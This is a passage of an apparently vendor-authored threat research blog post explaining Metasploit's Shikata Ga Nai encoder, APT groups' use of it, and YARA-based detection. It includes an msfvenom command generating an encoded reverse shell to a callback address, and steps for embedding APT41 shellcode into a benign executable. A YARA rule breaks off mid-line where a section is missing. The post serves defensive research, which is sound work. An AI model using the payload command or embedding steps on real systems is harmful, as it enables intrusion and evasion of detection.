Its vast library of\npocket exploits, pluggable payload environment, and simplicity of execution makes it the de\nfacto base platform. Metasploit is used by pentesters, security enthusiasts, script kiddies,\nand even malicious actors. It is so prevalent that its user base even includes APT threat\nactors, as we will demonstrate later in the blog post.\n\n\n-----\n\nDespite Metasploit s over 15 year existence, there are still core techniques that go\nundetected, allowing malicious actors to evade detection. One of these core techniques is\nthe Shikata Ga Nai (SGN) payload encoding scheme. Modern detection systems have\nimproved dramatically over the last several years and will often catch plain vanilla versions of\nknown malicious methods. In many cases though, if a threat actor knows what they are doing\nthey can slightly modify existing code to bypass detection.\n\nBefore we jump into how SGN works we’ll give a little background knowledge surrounding it.\nWhen threat actors plan to attack systems, they go through an assessment process of risk\nand reward. They cycle through questions of stealth and attribution. Some of these questions\ninclude: How much effort do I need to put into not getting caught? What happens if I get\ncaught? How long can I reasonably evade detection? Will the discovery of my presence be\nattributed back to me? One such way APT actors have attempted to elude detection in the\nfirst place has been via encoding.\n\nWe know shellcode is primarily a set of instructions designed to manipulate execution of a\nprogram in ways not originally intended. The goal is to inject this shellcode into a vulnerable\nprocess. To manually create shellcode, one can pull the opcodes from machine code directly\nor pull them from an assembler/disasembler tool such as MASM (Microsoft Macro\nAssembler). Raw generated opcodes often will not execute out of the box. They often require\nbeing touched up and made compatible with the processor they are executed on and the\nprogramming language they are being used for. An encoding scheme such as SGN takes\ncare of these incompatibilities. Also, shellcode in a non-obfuscated state can be readily\nrecognizable via static detection techniques. SGN provides obfuscation and at a first glance,\nrandomness in the obfuscation of the shellcode.\n\nMetasploit’s default configuration encodes all payloads. While Metasploit contains a variety\nof encoders, the most popular has been SGN. The phrase SGN in the Japanese language\nmeans “nothing can be done”. It was given this name as at the time it was created traditional\nanti-virus products had difficulty with detection. As mentioned, some AV vendors are now\ncatching vanilla implementations, but miss slightly modified variants.\n\nSGN is a polymorphic XOR additive feedback encoder. It is polymorphic in that each creation\nof encoded shellcode is going to be different from the next. It accomplishes this through a\nvariety of techniques such as dynamic instruction substitution, dynamic block ordering,\nrandomly interchanging registers, randomizing instruction ordering, inserting junk code, using\na random key, and randomization of instruction spacing between other instructions. The XOR\nadditive feedback piece in this case refers to the fact the algorithm is XORing future\ninstructions via a random key and then adding that instruction to the key to be used again to\nencode the next instruction. Decoding the shellcode is a process of following the steps in\nreverse.\n\n**Creating an SGN Encoded Payload**\n\n\n-----\n\nThe following steps can be recreated with Metasploit and your choice of\ndebugging/disassembly tools:\n\n1. First create a plain vanilla SGN encoded payload:\n\nmsfvenom -a x86 --platform windows -p windows/shell/reverse_tcp\nLHOST=192.169.0.36 LPORT=80 -b \"\\x00\" -e x86/shikata_ga_nai -f exe -o\n/root/Desktop/metasploit/IamNotBad.exe\n2. Open the file in a disassembler. Upon looking at the binary in a disassembler, you first\n\nnotice a great deal of junk instructions (Figure 1). Also, Metasploit by default does not\nset the memory location of the code (.text section in this case) as writable. This will\nneed to be set, otherwise the shellcode will not run.\n\nJunk instructions when viewing the binary in a disassembler\n\nFigure 1: Junk instructions when viewing the binary in a disassembler\n\nRWX Flag = E0000020\n\nFigure 2: RWX Flag = E0000020\n\nSkip the junk code and go directly to the algorithm, which can be done by inserting a jump\ninstruction\n\nFigure 3: Skip the junk code and go directly to the algorithm, which can be done by inserting\na jump instruction\n\n**Algorithm Breakdown**\n\nThe algorithm consists of:\n\n1. Initialization key specification.\n2. Retrieve a location relative to EIP (so that we can modify instructions moving forward\n\nbased on the address obtained)\n\nMetasploit commonly uses the fstenv/fnstenv instructions to put it on the stack\nwhere it can be popped into a register for use. There are other ways to get EIP if\nwanted.\n\n\n-----\n\n3. Go through a loop to decode other instructions (by default encoded instructions will all\n\nresides in the .text section)\n\nVanilla SGN zeroes out the register to be used as the counter and explicitly\nmoves the counter value into the register, so the loop portion is obvious. The loop\ninstruction is encoded so you won’t see it until decoding has gone far enough.\nSGN decodes instructions at a higher memory address (it could do lower\naddresses if it wanted to for more trickery). This is done by adding a value to the\nstored address from before (the one relative to EIP) and XORing it with the key. In\nthe example that follows you see the instruction XOR [eax+18h], esi t\n.text:00408B98.\nThe address from earlier (the one relative to EIP) is then modified and the key\nmay also be modified [Metasploit by default usually adds or subtracts an\ninstruction value somewhere relative to the address stored from before (the one\nrelative to EIP)].\nThe loop continues until all instructions are decoded and then it moves execution\nto the decoded shellcode. In this case the reverse shellcode.\n4. As a side note, Shikata Ga Nai allows for multiple iterations. If multiple iterations are\n\nchosen, steps 1 to 3 are repeated after the completion of the current iteration.\n\nAs you can see from each of the aforementioned steps, if you’re a defender and solely\nrelying on static detection, detection can be quite difficult. With something encoded like this,\nit is difficult to statically detect the specific malicious behavior without unrolling the encoded\ninstructions. Constantly scanning memory is computationally expensive, making it less\nfeasible. This leaves most detection platforms relying on the option of detecting via\nbehavioral indicators or sandboxes.\n\nCode before decoding\n\nFigure 4: Code before decoding\n\nInstructions being decoded\n\nFigure 5: Instructions being decoded\n\nFor many of those that have been in cyber security for a while, this is not new. What is still\nrelevant though is the fact that many malicious payloads encoded with SGN are still making\nit past defenses and still being used by threat actors. We noticed SGN encoded payloads still\nmaking it onto systems and we decided to investigate further. The results were both\nrewarding and surprising and led to additional detection methods discussed in the\n“Detection” section. It also gave us more awareness as to the extent SGN was still being\nused. The following is an example of a payload we recovered from an APT actor.\n\n**Embedding a Payload**\n\n\n-----\n\nFor this example, we used an existing APT41 sample and embedded the payload into a\nbenign PE. This APT41 sample is shellcode that is Shikata Ga Nai encoded.\n\n**MD5: def46c736a825c357918473e3c02b3ef**\n\nWe will take a benign PE we created (ImNotBad.exe) and we will embed the APT41 sample\nto show SGN in action. We create a new section called NewSec and set the section values\nappropriately.\n\nCalculate the size of the shell code. Start address 12000 and End Address 94C10. Make\nsure the size is within data that is there. The difference is 82c10.\n\nFigure 6: Calculate the size of the shell code. Start address 12000 and End Address 94C10.\nMake sure the size is within data that is there. The difference is 82c10.\n\nInsert the shell code into the benign PE (ImNotBad.exe)\n\nFigure 7: Insert the shell code into the benign PE (ImNotBad.exe)\n\nThe embedded shell code can be found in the code\n\nFigure 8: The embedded shell code can be found in the code\n\nPatch the code to jump to it\n\nFigure 9: Patch the code to jump to it\n\nHere are the four steps from the Shikata Ga Nai algorithm (mentioned previously)\ndemonstrated\n\nFigure 10: Here are the four steps from the Shikata Ga Nai algorithm (mentioned previously)\ndemonstrated\n\nIn Figure 11 and Figure 12, as the first set of instructions are decoded it appears it is\nattempting to avoid normal execution.

Further effort\nwas not applied to investigate the crash correctly, but when patching the code with nops, it\nexecutes the next decode sequence.\n\nSet of instructions are decoded it appears it is attempting to avoid normal execution\n\nFigure 11: Set of instructions are decoded it appears it is attempting to avoid normal\nexecution\n\nSet of instructions are decoded it appears it is attempting to avoid normal execution\n\n\n-----\n\nFigure 12: Set of instructions are decoded it appears it is attempting to avoid normal\nexecution\n\n**Detection**\n\nDetecting SGN encoded payloads can be difficult as a defender, especially if static detection\nis heavily relied upon. Decoding and unraveling the encoded instructions is necessary to\nidentify the intended malicious purposes. Constantly scanning memory is computationally\nexpensive, making it less feasible. This leaves most detection platforms relying on detection\nvia behavioral indicators and sandboxes. FireEye appliances contain both static and dynamic\ndetection components. Detection is achieved by a variety of engines, including FireEye's\n[machine learning engine, MalwareGuard. The numerous engines within FireEye appliances](https://www.fireeye.com/blog/products-and-services/2018/07/malwareguard-fireeye-machine-learning-model-to-detect-and-prevent-malware.html)\nserve specific purposes and have different strengths and weaknesses. Creating detection\naround these various engines allows FireEye to utilize each of their strengths. Correlating\nactivity between these engines allows for unique detection opportunities. This also allows for\nproduction detections that would otherwise not be possible when relying on a single engine\nfor detection. We were able to create production detections correlating the different engines\non the FireEye appliances to detect SGN encoded binaries with a high fidelity. The current\nproduction detections take advantage of static, dynamic and machine learning engines within\nthe FireEye appliance.\n\nAs an example of the complications concerned with detecting SGN, we will construct code\nencoded with a slightly modified version of Metasploit’s plain SGN algorithm (Figure 13):\n\nExample code for possible static detection\n\nFigure 13: Example code for possible static detection\n\nOne of the keys to writing a good static detection rule is recognizing the unique malicious\nbehaviors of what you are trying to detect. Next, being able to capture as much of that\nbehavior without causing false positives (FPs). Earlier in the post we listed the core\nbehaviors of the SGN algorithm. For sake of illustration, let’s try to match on some of those\nbehaviors. We’ll attempt to match on the key, the mechanism used to get EIP, and the XOR\nadditive feedback loop.\n\nIf we were trying to detect the code in Figure 13 statically, we could use the open source tool\nYara. As a first pass we could construct the following rule (Figure 14):\n\nExample SGN YARA static detection rule for the code in Figure 13\n\nFigure 14: Example SGN YARA static detection rule for the code in Figure 13\n\n\n-----\n\nIn the rule in Figure 14 we have added padding bytes to try and thwart an attacker that would\ninsert junk instructions. If an adversary realized what we were matching on it could be easily\ndefeated by inserting junk code beyond our padding. We could play the game of cat and\nmouse and continue to increase our padding based on what we saw, but this is not a good\nsolution. In addition, as we pad more bytes out, the rule becomes more FP prone. Besides\nadding junk code, other obvious evasion techniques an attacker could use include: using\ndifferent registers, performing arithmetic operations to obtain values or reordering\ninstructions. Metasploit does a decent job randomizing the algorithm with these things which\nmakes static detection more difficult. As we try to catch each modified version it could be\nnever-ending.\n\nStatic detection is a useful technique, but very limited. If this is all you rely on, you will miss\nmuch of the malicious behavior getting onto your systems. For SGN, we studied it further\nand identified the core behavioral pieces. We saw how it was still being used by modern\nmalware. The following is an example hunting rule that can be used to detect some of the\ncurrent common permutations created by vanilla x86-SGN in Metasploit. This rule can be\nfurther expanded upon to include additional logic if desired.\n\nrule Hunting_Rule_ShikataGaNai\n{\nmeta:\nauthor = \"Steven Miller\"\nstrings:\n$varInitializeAndXorCondition1_XorEAX = { B8 ?? ?? ?? ??

Some may use\n[Metasploit for legitimate purposes such as red team engagements, research or educational](https://www.fireeye.com/mandiant/red-team-assessment.html)\ntasks, while others may use the framework with a malicious intent. In the latter category,\nFireEye has historically observed APT20, a suspected Chinese nation state sponsored threat\ngroup, utilize Metasploit with SGN encoded payloads. APT20 is one of the many named\nthreat groups that FireEye tracks. This group has a primary focus on stealing data,\n[specifically intellectual properties. Other named groups include APT41 and FIN6. APT41 was](https://www.fireeye.com/resources/apt41-dual-espionage-and-cyber-crime-operation)\nformally disclosed by FireEye Intelligence earlier this year. This group has utilized SGN\nencoded payloads within custom developed backdoors. APT41 is a Chinese cyber threat\ngroup that has been observed carrying out financially motivated missions coinciding with\n[cyber-espionage operations. Financial threat group FIN6 has also used SGN encoded](https://www.fireeye.com/resources/pick-six-intercepting-fin6-intrusion-actor-recently-tied-ryuk-and-lockergoga-ransomware)\npayloads to carry out their missions, and they have historically relied upon various publicly\navailable tools. These missions largely involve theft of payment card data from point-of-sale\nsystems. FireEye has also observed numerous uncategorized threat groups utilizing\npayloads encoded with SGN. These are groups that FireEye tracks internally, but have not\nbeen announced formally. One of these groups in particular is UNC902, which is largely\nknown as the financially motivated group TA505 in public threat reports. FireEye has\nobserved UNC902 extensively use SGN encoding within their payloads and we continue to\nsee activity related to this group, even as recently as October 2019. Outside of these groups,\nwe continue to observe usage of SGN encoding within malicious samples. FireEye currently\nidentifies hundreds of SGN encoded payloads on a monthly basis. SGN encoded payloads\nare not always used with the same intent, but this is one side effect of being embedded into\nsuch a popular and freely available framework. Looking forward, we expect to see continued\nusage of SGN encoded payloads.\n\n\n-----",
